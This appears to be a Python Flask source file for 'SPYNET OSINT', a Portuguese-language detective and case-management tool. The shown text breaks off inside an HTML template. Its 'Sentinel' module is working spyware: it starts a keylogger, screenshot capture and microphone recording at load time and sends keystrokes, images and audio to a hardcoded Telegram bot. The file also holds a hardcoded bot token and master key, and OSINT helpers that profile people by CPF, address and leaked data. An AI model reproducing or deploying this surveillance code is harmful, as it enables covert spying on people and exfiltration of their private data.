"""
SPYNET OSINT ULTIMATE — SISTEMA ESTILO FBI / AGÊNCIA DE INTELIGÊNCIA
Design: Dark Mode + Neon Blue + Interface Tática
"""

from flask import Flask, render_template_string, request, jsonify, send_file, session, redirect, url_for
from datetime import datetime, timezone, timedelta
from io import BytesIO
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas as pdf_canvas
from functools import wraps
import json, os, requests, threading, time, re, hashlib, uuid
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
import numpy as np

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "spynet-osint-2026")

BR_TZ = timezone(timedelta(hours=-3))

# ============================================
# SISTEMA DE LICENCIAMENTO
# ============================================

LICENSE_FILE = "license.dat"
CHAVES_VALIDAS_FILE = "chaves_validas.json"
CHAVE_MESTRA = "SPYNET-MASTER-2026-VIP"

def gerar_hwid():
    try:
        mac = uuid.getnode()
        nome = os.environ.get('COMPUTERNAME', os.environ.get('HOSTNAME', 'unknown'))
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            product_id = winreg.QueryValueEx(key, "ProductId")[0]
        except:
            product_id = "unknown"
        dados = f"{mac}-{nome}-{product_id}"
        return hashlib.sha256(dados.encode()).hexdigest()[:16].upper()
    except:
        return "UNKNOWN-HWID"

def validar_chave(chave):
    try:
        if os.path.exists(CHAVES_VALIDAS_FILE):
            with open(CHAVES_VALIDAS_FILE, "r", encoding="utf-8") as f:
                chaves_validas = json.load(f)
                for c in chaves_validas:
                    if c["chave"] == chave and c.get("ativa", True):
                        expiracao = c.get("expiracao_timestamp", 0)
                        if expiracao == 0 or time.time() < expiracao:
                            return True, c.get("tipo", "MENSAL"), expiracao
        return False, None, None
    except:
        return False, None, None

def verificar_licenca():
    try:
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, "r", encoding="utf-8") as f:
                dados = json.load(f)
            hwid_salva = dados.get("hwid", "")
            expiracao = dados.get("expiracao", 0)
            hwid_atual = gerar_hwid()
            if hwid_salva != hwid_atual:
                return False, "Licença vinculada a outro computador"
            if expiracao > 0 and time.time() > expiracao:
                return False, "Licença expirada"
            return True, "Licença Válida"
        else:
            return False, "Nenhuma licença encontrada"
    except:
        return False, "Erro ao verificar licença"

def ativar_licenca(chave):
    valido, tipo, expiracao = validar_chave(chave)
    if valido:
        hwid = gerar_hwid()
        dados = {
            "chave": chave,
            "hwid": hwid,
            "tipo": tipo,
            "expiracao": expiracao,
            "ativado_em": time.time(),
            "versao": "1.0"
        }
        with open(LICENSE_FILE, "w", encoding="utf-8") as f:
            json.dump(dados, f, indent=2)
        return True, f"Licença {tipo} ativada com sucesso!"
    return False, "Chave inválida"

def criar_chave_mestra():
    chave_data = {
        "chave": CHAVE_MESTRA,
        "cliente": "MASTER",
        "tipo": "VITALICIA",
        "dias": 9999,
        "criado_em": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "expiracao": "31/12/2099",
        "expiracao_timestamp": 4102444800,
        "ativa": True
    }
    chaves = []
    if os.path.exists(CHAVES_VALIDAS_FILE):
        with open(CHAVES_VALIDAS_FILE, "r", encoding="utf-8") as f:
            chaves = json.load(f)
    if not any(c["chave"] == CHAVE_MESTRA for c in chaves):
        chaves.append(chave_data)
        with open(CHAVES_VALIDAS_FILE, "w", encoding="utf-8") as f:
            json.dump(chaves, f, ensure_ascii=False, indent=2)

# ============================================
# CONFIGURAÇÕES
# ============================================
SISTEMA_SENHA = os.environ.get("SISTEMA_SENHA", "spynet2026")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "5672315001")

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
CASOS_FILE = os.path.join(DATA_DIR, "casos.json")
SENTINEL_DIR = os.path.join(DATA_DIR, "sentinel")
LOG_DIR = os.path.join(SENTINEL_DIR, "logs")
SCREENSHOT_DIR = os.path.join(SENTINEL_DIR, "screenshots")
AUDIO_DIR = os.path.join(SENTINEL_DIR, "audio")
KEYLOG_PATH = os.path.join(LOG_DIR, "syslog.txt")

for pasta in [DATA_DIR, SENTINEL_DIR, LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
    os.makedirs(pasta, exist_ok=True)

# ============================================
# SENTINEL (MONITORAMENTO)
# ============================================
monitor_ativo = False
tempo_screenshot = 5
tempo_audio = 10
ultima_screenshot = None
ultimo_audio = None
ultimas_teclas = []
buffer_teclas = ""
ultimo_tempo = time.time()

def enviar_telegram(texto, caminho=None):
    try:
        if caminho and os.path.exists(caminho):
            with open(caminho, "rb") as f:
                url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
                requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": texto}, files={"document": f}, timeout=5)
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": texto}, timeout=5)
    except:
        pass

def processar_tecla(tecla):
    global buffer_teclas, ultimas_teclas, monitor_ativo, ultimo_tempo
    if not monitor_ativo:
        return
    try:
        if hasattr(tecla, 'char') and tecla.char:
            caractere = tecla.char
            if caractere.isalnum() or caractere in [' ', '.', ',', '!', '?', '@', '#', '$', '-', '_']:
                buffer_teclas += caractere
                ultimo_tempo = time.time()
            elif caractere == '\r' or caractere == '\n':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
        else:
            tecla_nome = str(tecla).replace('Key.', '')
            if tecla_nome == 'space':
                buffer_teclas += ' '
                ultimo_tempo = time.time()
            elif tecla_nome == 'enter':
                if buffer_teclas.strip():
                    registrar_frase(buffer_teclas.strip())
                buffer_teclas = ""
            elif tecla_nome == 'backspace':
                buffer_teclas = buffer_teclas[:-1]
        
        if time.time() - ultimo_tempo > 2 and buffer_teclas.strip():
            registrar_frase(buffer_teclas.strip())
            buffer_teclas = ""
    except:
        pass

def registrar_frase(frase):
    global ultimas_teclas
    if not frase.strip():
        return
    registro = f"[{datetime.now().strftime('%H:%M:%S')}] {frase}"
    with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
        f.write(registro + "\n")
    ultimas_teclas.append(registro)
    if len(ultimas_teclas) > 100:
        ultimas_teclas.pop(0)
    enviar_telegram(f"⌨️ {frase}")

def capturar_screenshot():
    global ultima_screenshot, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"scr_{int(time.time())}.png"
        caminho = os.path.join(SCREENSHOT_DIR, nome)
        pyautogui.screenshot(caminho)
        ultima_screenshot = caminho
        enviar_telegram("📸 Screenshot", caminho)
        return caminho
    except:
        return None

def capturar_audio():
    global ultimo_audio, monitor_ativo
    if not monitor_ativo:
        return None
    try:
        nome = f"aud_{int(time.time())}.wav"
        caminho = os.path.join(AUDIO_DIR, nome)
        fs = 44100
        duracao = 5
        gravacao = sd.rec(int(duracao * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        gravacao = np.clip(gravacao * 5.0, -1.0, 1.0)
        sf.write(caminho, gravacao, fs)
        ultimo_audio = caminho
        enviar_telegram("🎤 Áudio", caminho)
        return caminho
    except:
        return None

def loop_captura():
    global monitor_ativo, tempo_screenshot
    while True:
        if monitor_ativo:
            capturar_screenshot()
        time.sleep(tempo_screenshot)

def loop_audio():
    global monitor_ativo, tempo_audio
    while True:
        if monitor_ativo:
            capturar_audio()
        time.sleep(tempo_audio)

def iniciar_keylogger():
    with keyboard.Listener(on_press=processar_tecla) as listener:
        listener.join()

threading.Thread(target=iniciar_keylogger, daemon=True).start()
threading.Thread(target=loop_captura, daemon=True).start()
threading.Thread(target=loop_audio, daemon=True).start()

# ============================================
# FUNÇÕES OSINT
# ============================================

def buscar_bens_patrimoniais(cpf_cnpj):
    resultados = []
    resultados.append({"categoria": "🏠 IMÓVEIS", "titulo": "Buscar Imóveis por CPF/CNPJ", "descricao": "Localize imóveis registrados", "url": f"https://www.google.com/search?q=registro+de+imoveis+cpf+{cpf_cnpj}", "icone": "🏠"})
    resultados.append({"categoria": "🚗 VEÍCULOS", "titulo": "Buscar Veículos por CPF", "descricao": "Identifique veículos no DETRAN", "url": f"https://www.google.com/search?q=consulta+veiculo+renavam+por+cpf+{cpf_cnpj}", "icone": "🚗"})
    if len(cpf_cnpj) == 14:
        resultados.append({"categoria": "🏢 EMPRESAS", "titulo": "Consulta CNPJ Completa", "descricao": "Dados cadastrais, sócios", "url": f"https://www.receitaws.com.br/v1/cnpj/{cpf_cnpj}", "icone": "🏢"})
    resultados.append({"categoria": "👥 PARTICIPAÇÕES", "titulo": "Sócios e Administradores", "descricao": "Empresas onde é sócio", "url": f"https://www.google.com/search?q=socio+administrador+{cpf_cnpj}", "icone": "👥"})
    return resultados

def buscar_localizacao_pessoa(cpf, nome):
    resultados = []
    resultados.append({"categoria": "📍 ENDEREÇO", "titulo": "Buscar Endereço por CPF", "descricao": "Localize endereço", "url": f"https://www.google.com/search?q=endereco+por+cpf+{cpf}", "icone": "📍"})
    resultados.append({"categoria": "📞 TELEFONES", "titulo": "Buscar Telefones", "descricao": "Números associados", "url": f"https://www.google.com/search?q=telefone+{nome.replace(' ', '+')}", "icone": "📞"})
    resultados.append({"categoria": "📧 E-MAILS", "titulo": "Buscar E-mails", "descricao": "E-mails vinculados", "url": f"https://www.google.com/search?q=email+{nome.replace(' ', '+')}", "icone": "📧"})
    return resultados

def buscar_analise_credito(cpf):
    resultados = []
    resultados.append({"categoria": "📊 SCORE", "titulo": "Consultar Score Serasa/SPC", "descricao": "Score de crédito", "url": "https://www.serasa.com.br/consulta-cpf/", "icone": "📊"})
    resultados.append({"categoria": "🚫 RESTRIÇÕES", "titulo": "Restrições Bancárias", "descricao": "SPC, Serasa, protestos", "url": "https://www.serasa.com.br/consulta-cpf/restricoes/", "icone": "🚫"})
    resultados.append({"categoria": "📋 PROTESTOS", "titulo": "Protestos em Cartório", "descricao": "Verificar protestos", "url": f"https://www.google.com/search?q=protesto+cartorio+cpf+{cpf}", "icone": "📋"})
    return resultados

def buscar_redes_sociais_avancado(nome, username=None):
    resultados = []
    redes = [
        {"nome": "Instagram", "url": f"https://www.instagram.com/{username if username else nome.replace(' ', '')}", "icone": "📷"},
        {"nome": "Facebook", "url": f"https://www.facebook.com/search/top?q={nome.replace(' ', '%20')}", "icone": "📘"},
        {"nome": "Twitter/X", "url": f"https://twitter.com/search?q={nome.replace(' ', '%20')}", "icone": "🐦"},
        {"nome": "LinkedIn", "url": f"https://www.linkedin.com/search/results/people/?keywords={nome.replace(' ', '%20')}", "icone": "💼"},
        {"nome": "TikTok", "url": f"https://www.tiktok.com/search?q={nome.replace(' ', '%20')}", "icone": "🎵"},
        {"nome": "YouTube", "url": f"https://www.youtube.com/results?search_query={nome.replace(' ', '+')}", "icone": "📺"},
    ]
    for rede in redes:
        resultados.append({"categoria": "🌐 REDES SOCIAIS", "titulo": rede["nome"], "descricao": f"Perfil no {rede['nome']}", "url": rede["url"], "icone": rede["icone"]})
    return resultados

def buscar_dados_vazados_br(email):
    resultados = []
    sites = [
        {"nome": "Have I Been Pwned", "url": f"https://haveibeenpwned.com/account/{email}", "icone": "🔓"},
        {"nome": "LeakCheck", "url": f"https://leakcheck.io/?q={email}", "icone": "🔎"},
        {"nome": "DeHashed", "url": "https://dehashed.com", "icone": "🔍"},
        {"nome": "BreachDirectory", "url": f"https://breachdirectory.org/#{email}", "icone": "📂"},
    ]
    for site in sites:
        resultados.append({"categoria": "🔓 DADOS VAZADOS", "titulo": site["nome"], "descricao": "Verificar vazamentos", "url": site["url"], "icone": site["icone"]})
    return resultados

# ============================================
# FUNÇÕES DOS CASOS
# ============================================

def _load(path, default):
    try:
        if not os.path.exists(path): return default
        with open(path, "r", encoding="utf-8") as f: return json.load(f)
    except: return default

def _save(path, obj):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f: json.dump(obj, f, ensure_ascii=False, indent=2)
    os.replace(tmp, path)

def load_casos(): return _load(CASOS_FILE, [])
def save_casos(c): _save(CASOS_FILE, c)

def now_br():
    return datetime.now(BR_TZ).strftime("%d/%m/%Y %H:%M")

def login_required(f):
    @wraps(f)
    def dec(*args, **kwargs):
        if not session.get("logado"): return redirect(url_for("login"))
        return f(*args, **kwargs)
    return dec

# ============================================
# ROTA DE ATIVAÇÃO
# ============================================

ATIVACAO_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SPYNET — ATIVAÇÃO</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:radial-gradient(ellipse at 20% 30%, #0a0e1a, #03060c);font-family:'Share Tech Mono',monospace;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:rgba(5,10,20,0.9);border:1px solid #00ffcc;border-radius:4px;padding:40px;width:480px;text-align:center;box-shadow:0 0 40px rgba(0,255,204,0.1)}
        .logo{font-size:64px;margin-bottom:10px}
        h1{color:#00ffcc;font-size:28px;letter-spacing:4px;text-shadow:0 0 10px #00ffcc}
        .hwid{background:#0a0e1a;padding:12px;border-radius:4px;margin:20px 0;font-size:12px;color:#8899aa;border:1px solid #00ffcc20}
        input{width:100%;padding:14px;background:#0a0e1a;border:1px solid #00ffcc;border-radius:4px;color:#00ffcc;text-align:center;font-family:monospace;margin:15px 0}
        input:focus{outline:none;box-shadow:0 0 15px #00ffcc}
        button{width:100%;padding:14px;background:linear-gradient(90deg,#00ffcc,#00ccff);border:none;border-radius:4px;font-weight:bold;cursor:pointer;font-family:monospace;font-size:16px;transition:all .3s}
        button:hover{transform:scale(1.02);box-shadow:0 0 20px #00ffcc}
        .erro{color:#ff2244;margin-top:15px;font-size:12px}
        .footer{margin-top:20px;font-size:10px;color:#334455}
    </style>
</head>
<body>
<div class="card">
    <div class="logo">🔐</div>
    <h1>ATIVAÇÃO</h1>
    <div class="hwid">HWID: {{ hwid }}</div>
    <form method="POST">
        <input type="text" name="chave" placeholder="INSIRA A CHAVE DE ATIVAÇÃO" autofocus>
        <button type="submit">🔓 ATIVAR SISTEMA</button>
    </form>
    {% if erro %}<div class="erro">{{ erro }}</div>{% endif %}
    <div class="footer">SPYNET SECURITY • SISTEMA DE INVESTIGAÇÃO PROFISSIONAL</div>
</div>
</body>
</html>
'''

@app.route("/ativar", methods=["GET","POST"])
def ativar():
    hwid = gerar_hwid()
    erro = ""
    if request.method == "POST":
        chave = request.form.get("chave", "").strip().upper()
        if chave:
            ok, msg = ativar_licenca(chave)
            if ok:
                return redirect(url_for("login"))
            else:
                erro = msg
        else:
            erro = "Digite uma chave válida"
    return render_template_string(ATIVACAO_HTML, hwid=hwid, erro=erro)

# ============================================
# ROTAS PRINCIPAIS
# ============================================

@app.route("/")
def index():
    valido, _ = verificar_licenca()
    if not valido:
        return redirect(url_for("ativar"))
    if not session.get("logado"): 
        return redirect(url_for("login"))
    return redirect(url_for("painel"))

@app.route("/login", methods=["GET","POST"])
def login():
    valido, _ = verificar_licenca()
    if not valido:
        return redirect(url_for("ativar"))
    erro = ""
    if request.method == "POST":
        if request.form.get("senha") == SISTEMA_SENHA:
            session["logado"] = True
            return redirect(url_for("painel"))
        erro = "ACESSO NEGADO"
    return render_template_string(LOGIN_HTML, erro=erro)

@app.route("/logout")
def logout():
    session.pop("logado", None)
    return redirect(url_for("login"))

@app.route("/painel")
@login_required
def painel():
    casos = load_casos()
    total = len(casos)
    ativos = len([c for c in casos if c.get("status") == "Em andamento"])
    concl = len([c for c in casos if c.get("status") == "Concluído"])
    return render_template_string(PAINEL_HTML, 
        casos=list(reversed(casos)),
        total=total, ativos=ativos, concl=concl)

# ============================================
# ROTAS OSINT
# ============================================

@app.route("/osint/bens", methods=["POST"])
@login_required
def osint_bens():
    data = request.get_json() or {}
    cpf_cnpj = data.get("cpf_cnpj", "")
    resultados = buscar_bens_patrimoniais(cpf_cnpj)
    return jsonify({"resultados": resultados})

@app.route("/osint/localizacao", methods=["POST"])
@login_required
def osint_localizacao():
    data = request.get_json() or {}
    cpf = data.get("cpf", "")
    nome = data.get("nome", "")
    resultados = buscar_localizacao_pessoa(cpf, nome)
    return jsonify({"resultados": resultados})

@app.route("/osint/credito", methods=["POST"])
@login_required
def osint_credito():
    data = request.get_json() or {}
    cpf = data.get("cpf", "")
    resultados = buscar_analise_credito(cpf)
    return jsonify({"resultados": resultados})

@app.route("/osint/redes", methods=["POST"])
@login_required
def osint_redes():
    data = request.get_json() or {}
    nome = data.get("nome", "")
    username = data.get("username", "")
    resultados = buscar_redes_sociais_avancado(nome, username)
    return jsonify({"resultados": resultados})

@app.route("/osint/vazamentos", methods=["POST"])
@login_required
def osint_vazamentos():
    data = request.get_json() or {}
    email = data.get("email", "")
    resultados = buscar_dados_vazados_br(email)
    return jsonify({"resultados": resultados})

@app.route("/osint/pesquisar")
@login_required
def osint_pesquisar():
    return render_template_string(OSINT_BR_HTML)

# ============================================
# ROTAS DOS CASOS
# ============================================

@app.route("/novo_caso", methods=["GET","POST"])
@login_required
def novo_caso():
    if request.method == "POST":
        d = request.form
        caso = {
            "id": f"SPN-{datetime.now(BR_TZ).strftime('%Y%m%d%H%M%S')}",
            "criado_em": now_br(),
            "investigador": "Salveci dos Santos",
            "status": "Em andamento",
            "tipo": d.get("tipo", ""),
            "cliente": d.get("cliente", ""),
            "investigado": d.get("investigado", ""),
            "objetivo": d.get("objetivo", ""),
            "etapas": [],
            "notas": d.get("notas", ""),
        }
        casos = load_casos()
        casos.append(caso)
        save_casos(casos)
        return redirect(url_for("caso_detalhe", caso_id=caso["id"]))
    return render_template_string(NOVO_CASO_HTML)

@app.route("/caso/<caso_id>")
@login_required
def caso_detalhe(caso_id):
    casos = load_casos()
    caso = next((c for c in casos if c["id"] == caso_id), None)
    if not caso: return redirect(url_for("painel"))
    return render_template_string(CASO_DETALHE_HTML, caso=caso)

@app.route("/api/caso/<caso_id>/etapa", methods=["POST"])
@login_required
def adicionar_etapa(caso_id):
    data = request.get_json(force=True, silent=True) or {}
    casos = load_casos()
    for c in casos:
        if c["id"] == caso_id:
            etapa = {
                "num": len(c.get("etapas", [])) + 1,
                "titulo": data.get("titulo", ""),
                "tipo": data.get("tipo", ""),
                "dados": data.get("dados", ""),
                "ts": now_br()
            }
            c.setdefault("etapas", []).append(etapa)
            break
    save_casos(casos)
    return jsonify({"ok": True})

@app.route("/api/caso/<caso_id>/status", methods=["POST"])
@login_required
def atualizar_status(caso_id):
    data = request.get_json(force=True, silent=True) or {}
    casos = load_casos()
    for c in casos:
        if c["id"] == caso_id:
            c["status"] = data.get("status", c["status"])
            break
    save_casos(casos)
    return jsonify({"ok": True})

@app.route("/api/limpar_casos", methods=["POST"])
@login_required
def limpar_casos():
    save_casos([])
    return jsonify({"ok": True})

# ============================================
# ROTAS DO SENTINEL
# ============================================

@app.route("/api/sentinel/status", methods=["GET", "POST"])
@login_required
def sentinel_status():
    global monitor_ativo
    if request.method == "POST":
        data = request.get_json() or {}
        monitor_ativo = data.get("ativo", monitor_ativo)
        return jsonify({"ativo": monitor_ativo})
    
    stats = {
        'screenshots': len([f for f in os.listdir(SCREENSHOT_DIR) if f.startswith('scr_')]),
        'audios': len([f for f in os.listdir(AUDIO_DIR) if f.startswith('aud_')]),
        'teclas': len(ultimas_teclas)
    }
    return jsonify({
        "ativo": monitor_ativo,
        "tempo_screenshot": tempo_screenshot,
        "tempo_audio": tempo_audio,
        "ultima_screenshot": ultima_screenshot,
        "ultimo_audio": ultimo_audio,
        "ultimas_teclas": ultimas_teclas[-30:],
        "stats": stats
    })

@app.route("/api/sentinel/screenshot/latest")
@login_required
def sentinel_screenshot():
    if ultima_screenshot and os.path.exists(ultima_screenshot):
        return send_file(ultima_screenshot, mimetype='image/png')
    return "", 404

@app.route("/api/sentinel/audio/latest")
@login_required
def sentinel_audio():
    if ultimo_audio and os.path.exists(ultimo_audio):
        return send_file(ultimo_audio, mimetype='audio/wav')
    return "", 404

@app.route("/api/sentinel/keylog")
@login_required
def sentinel_keylog():
    if os.path.exists(KEYLOG_PATH):
        with open(KEYLOG_PATH, 'r', encoding='utf-8') as f:
            linhas = f.readlines()[-50:]
        return jsonify({'teclas': linhas})
    return jsonify({'teclas': []})

@app.route("/api/sentinel/clear", methods=["POST"])
@login_required
def sentinel_clear():
    global ultimas_teclas, ultima_screenshot, ultimo_audio
    ultimas_teclas = []
    if os.path.exists(KEYLOG_PATH):
        open(KEYLOG_PATH, 'w').close()
    for f in os.listdir(SCREENSHOT_DIR):
        try:
            os.remove(os.path.join(SCREENSHOT_DIR, f))
        except:
            pass
    for f in os.listdir(AUDIO_DIR):
        try:
            os.remove(os.path.join(AUDIO_DIR, f))
        except:
            pass
    ultima_screenshot = None
    ultimo_audio = None
    return jsonify({"ok": True})

@app.route("/sentinel")
@login_required
def sentinel_page():
    return render_template_string(SENTINEL_HTML)

# ============================================
# PDF
# ============================================

@app.route("/relatorio/<caso_id>.pdf")
@login_required
def gerar_relatorio(caso_id):
    casos = load_casos()
    caso = next((c for c in casos if c["id"] == caso_id), None)
    if not caso: return "Caso não encontrado", 404

    buffer = BytesIO()
    c = pdf_canvas.Canvas(buffer, pagesize=A4)
    W, H = A4

    FUNDO = (0.04, 0.05, 0.10)
    AZUL = (0.00, 0.53, 1.00)
    VERDE = (0.00, 0.80, 0.40)
    BRANCO = (1.00, 1.00, 1.00)
    CINZA = (0.53, 0.60, 0.67)
    FUNDO2 = (0.07, 0.09, 0.15)

    def pg_fundo():
        c.setFillColorRGB(*FUNDO)
        c.rect(0, 0, W, H, fill=1, stroke=0)

    def linha(y, cor=AZUL, larg=W-80):
        c.setFillColorRGB(*cor)
        c.rect(40, y, larg, 1.5, fill=1, stroke=0)

    pg_fundo()
    c.setFillColorRGB(*FUNDO2)
    c.rect(0, H-100, W, 100, fill=1, stroke=0)
    c.setFillColorRGB(*AZUL)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(40, H-30, "SPYNET SECURITY")
    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 9)
    c.drawString(40, H-46, "Tecnologia Forense & Soluções Digitais")
    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 9)
    c.drawRightString(W-40, H-30, f"ID: {caso['id']}")
    c.drawRightString(W-40, H-46, f"Emitido: {now_br()}")
    linha(H-108)
    c.setFillColorRGB(*BRANCO)
    c.setFont("Helvetica-Bold", 26)
    c.drawCentredString(W/2, H-170, "RELATÓRIO DE INVESTIGAÇÃO")
    c.setFillColorRGB(*AZUL)
    c.setFont("Helvetica-Bold", 14)
    c.drawCentredString(W/2, H-195, "OSINT — Inteligência Digital")
    c.setFillColorRGB(*FUNDO2)
    c.roundRect(60, H-330, W-120, 110, 10, fill=1, stroke=0)
    c.setFillColorRGB(*AZUL)
    c.rect(60, H-330, 4, 110, fill=1, stroke=0)

    campos = [
        ("Investigado", caso.get("investigado", "—")),
        ("Tipo de caso", caso.get("tipo", "—")),
        ("Cliente", caso.get("cliente", "—")),
        ("Status", caso.get("status", "—")),
    ]
    yi = H-250
    for label, val in campos:
        c.setFillColorRGB(*CINZA)
        c.setFont("Helvetica", 9)
        c.drawString(80, yi, label.upper())
        c.setFillColorRGB(*BRANCO)
        c.setFont("Helvetica-Bold", 10)
        c.drawString(80, yi-14, val)
        yi -= 36

    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 9)
    c.drawCentredString(W/2, 40, "CONFIDENCIAL — Uso restrito ao contratante")
    c.drawCentredString(W/2, 26, "SPYNET Security • Brasília-DF • © 2026")
    c.showPage()

    for etapa in caso.get("etapas", []):
        pg_fundo()
        c.setFillColorRGB(*FUNDO2)
        c.rect(0, H-60, W, 60, fill=1, stroke=0)
        c.setFillColorRGB(*AZUL)
        c.setFont("Helvetica-Bold", 10)
        c.drawString(40, H-25, "SPYNET SECURITY")
        c.setFillColorRGB(*CINZA)
        c.setFont("Helvetica", 9)
        c.drawRightString(W-40, H-25, f"{caso['id']} • {etapa['ts']}")
        linha(H-68)
        c.setFillColorRGB(*AZUL)
        c.circle(58, H-104, 16, fill=1, stroke=0)
        c.setFillColorRGB(*BRANCO)
        c.setFont("Helvetica-Bold", 14)
        c.drawCentredString(58, H-109, str(etapa["num"]))
        c.setFillColorRGB(*BRANCO)
        c.setFont("Helvetica-Bold", 16)
        c.drawString(86, H-102, f"ETAPA {etapa['num']}: {etapa['titulo'].upper()}")
        c.setFillColorRGB(*CINZA)
        c.setFont("Helvetica", 10)
        c.drawString(86, H-118, etapa.get("tipo", ""))
        linha(H-128, cor=CINZA)

        y = H - 160
        dados = etapa.get("dados", "").split("\n")
        for linha_txt in dados:
            if y < 80:
                c.showPage()
                pg_fundo()
                y = H - 60
            if linha_txt.strip().startswith("•") or linha_txt.strip().startswith("-"):
                c.setFillColorRGB(*AZUL)
                c.circle(54, y+3, 3, fill=1, stroke=0)
                c.setFillColorRGB(*BRANCO)
                c.setFont("Helvetica", 10)
                c.drawString(64, y, linha_txt.strip().lstrip("•-").strip())
            elif linha_txt.strip().isupper() and len(linha_txt.strip()) > 3:
                c.setFillColorRGB(*AZUL)
                c.setFont("Helvetica-Bold", 11)
                c.drawString(40, y, linha_txt.strip())
                y -= 4
                c.setFillColorRGB(*AZUL)
                c.rect(40, y, 200, 1, fill=1, stroke=0)
            elif linha_txt.strip() == "":
                y -= 6
                continue
            else:
                c.setFillColorRGB(*BRANCO)
                c.setFont("Helvetica", 10)
                txt = linha_txt.strip()
                while len(txt) > 90:
                    c.drawString(40, y, txt[:90])
                    txt = txt[90:]
                    y -= 16
                c.drawString(40, y, txt)
            y -= 20

        c.setFillColorRGB(*CINZA)
        c.setFont("Helvetica", 8)
        c.drawCentredString(W/2, 26, "CONFIDENCIAL • SPYNET Security • Brasília-DF • © 2026")
        c.showPage()

    pg_fundo()
    c.setFillColorRGB(*FUNDO2)
    c.rect(0, H-60, W, 60, fill=1, stroke=0)
    c.setFillColorRGB(*AZUL)
    c.setFont("Helvetica-Bold", 10)
    c.drawString(40, H-25, "SPYNET SECURITY")
    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 9)
    c.drawRightString(W-40, H-25, f"{caso['id']}")
    linha(H-68)
    c.setFillColorRGB(*VERDE)
    c.setFont("Helvetica-Bold", 18)
    c.drawString(40, H-100, "CONCLUSÃO INVESTIGATIVA")
    linha(H-112, cor=VERDE, larg=220)
    c.setFillColorRGB(*BRANCO)
    c.setFont("Helvetica", 11)
    y = H - 140
    objetivo = caso.get("objetivo", "Não informado")
    c.drawString(40, y, "Objetivo do caso:")
    y -= 18
    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 10)
    for linha_obj in objetivo.split("\n"):
        c.drawString(50, y, linha_obj)
        y -= 16
    y -= 10
    c.setFillColorRGB(*BRANCO)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(40, y, f"Etapas concluídas: {len(caso.get('etapas', []))}")
    y -= 24
    c.setFillColorRGB(*FUNDO2)
    c.roundRect(40, y-50, W-80, 60, 8, fill=1, stroke=0)
    c.setFillColorRGB(*VERDE)
    c.setFont("Helvetica-Bold", 10)
    c.drawString(52, y+2, "CLÁUSULA DE RESPONSABILIDADE")
    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 9)
    c.drawString(52, y-14, "Este relatório foi elaborado com base em fontes públicas de acesso lícito (LGPD – Lei 13.709/2018).")
    c.drawString(52, y-28, "O uso das informações é de responsabilidade exclusiva do contratante.")
    c.setFillColorRGB(*AZUL)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(40, 120, "Investigador:")
    c.setFillColorRGB(*BRANCO)
    c.drawString(130, 120, "Salveci dos Santos")
    c.setFillColorRGB(*CINZA)
    c.setFont("Helvetica", 10)
    c.drawString(40, 105, "Detetive Particular • SPYNET Security")
    linha(90, cor=CINZA)
    c.setFont("Helvetica", 8)
    c.drawCentredString(W/2, 30, "CONFIDENCIAL • SPYNET Security • Brasília-DF • © 2026")
    c.showPage()
    c.save()
    buffer.seek(0)

    nome = f"SPYNET_{caso['id']}_{datetime.now(BR_TZ).strftime('%Y%m%d')}.pdf"
    return send_file(buffer, as_attachment=True, download_name=nome, mimetype="application/pdf")

# ============================================
# TEMPLATES ESTILO FBI ULTIMATE
# ============================================

LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SPYNET — ACESSO RESTRITO</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:radial-gradient(ellipse at 20% 30%, #0a0e1a, #03060c);font-family:'Share Tech Mono',monospace;display:flex;justify-content:center;align-items:center;height:100vh;position:relative}
        body::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(0,136,255,.02) 0px,rgba(0,136,255,.02) 2px,transparent 2px,transparent 8px);pointer-events:none}
        .card{background:rgba(5,10,20,0.9);border:1px solid #00ffcc;border-radius:4px;padding:40px;width:420px;text-align:center;box-shadow:0 0 40px rgba(0,255,204,0.1),inset 0 1px 0 rgba(255,255,255,0.05);backdrop-filter:blur(5px)}
        .logo{font-size:56px;margin-bottom:10px;filter:drop-shadow(0 0 8px #00ffcc);animation:glow 2s ease-in-out infinite}
        @keyframes glow{0%,100%{text-shadow:0 0 5px #00ffcc}50%{text-shadow:0 0 20px #00ffcc}}
